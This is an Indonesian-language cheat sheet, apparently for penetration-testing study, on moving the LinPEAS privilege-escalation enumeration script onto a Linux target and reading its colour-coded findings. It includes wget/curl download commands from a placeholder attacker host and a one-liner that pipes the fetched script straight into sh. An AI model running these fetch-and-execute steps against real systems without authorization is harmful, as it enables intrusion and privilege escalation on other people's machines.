# 🐧 LinPEAS — Otomatisasi Enumerasi Privilege Escalation Linux

> **Tujuan:** Menjalankan skrip **LinPEAS** untuk memperoleh detail sistem yang membantu menemukan vektor privilege escalation pada Linux.

---

## 📌 Penjelasan Singkat

LinPEAS (bagian dari **PEASS-ng**) adalah script **enumerasi otomatis** yang mengumpulkan informasi penting: SUID/SGID binaries, sudo permissions, cron jobs, writable files, capabilities, credentials, dan lainnya.

---

## 📦 Sumber & Instalasi

- **GitHub:** <https://github.com/peass-ng/PEASS-ng>
- **Kali Linux:** `/usr/share/peass/linpeas/linpeas.sh`
- **Cari binary:** `locate linpeas`

---

## 📥 Transfer ke Target

### 1️⃣ Jalankan HTTP Server di Kali

```bash
python3 -m http.server 8089
```

File `linpeas.sh` harus berada di direktori yang di‑share.

### 2️⃣ Unduh dari Target

```bash
wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
# atau curl
curl http://<LHOST>:8089/linpeas.sh -o /tmp/linpeas.sh
```

## ▶️ Eksekusi LinPEAS

```bash
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out
```

Atau one‑liner langsung:

```bash
curl http://<LHOST>:8089/linpeas.sh | sh
```

---

## 📊 Membaca Hasil

LinPEAS menandai temuan dengan warna:

| Warna | Makna |
|------|------|
| **MERAH** | Potensi privilege escalation kritis |
| **KUNING** | Perlu verifikasi manual |
| **HIJAU** | Informasi umum |

Contoh output ringkas:

```text
SUID / SGID binaries → /usr/bin/passwd (SUID)
sudo permissions → user can run /usr/bin/docker as root
cron jobs → /etc/cron.d/backup
Writable files → /tmp/**
Capabilities → CAP_NET_ADMIN on /usr/bin/ping
```

---

## 📋 Checklist LinPEAS

- [ ] Transfer `linpeas.sh` ke target (HTTP, wget, curl, SCP).
- [ ] Set executable (`chmod +x`).
- [ ] Jalankan dan simpan output (`| tee`).
- [ ] Tinjau temuan MERAH/KUNING.
- [ ] Verifikasi pada target (cek binary, sudo, cron, dll.).
- [ ] Dokumentasikan hasil untuk langkah privilege escalation selanjutnya.

---

## 📚 Referensi

- [PEASS-ng – LinPEAS Documentation](https://github.com/peass-ng/PEASS-ng)
- [Kali Linux – LinPEAS Location](https://www.kali.org/tools/linpeas/)
- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
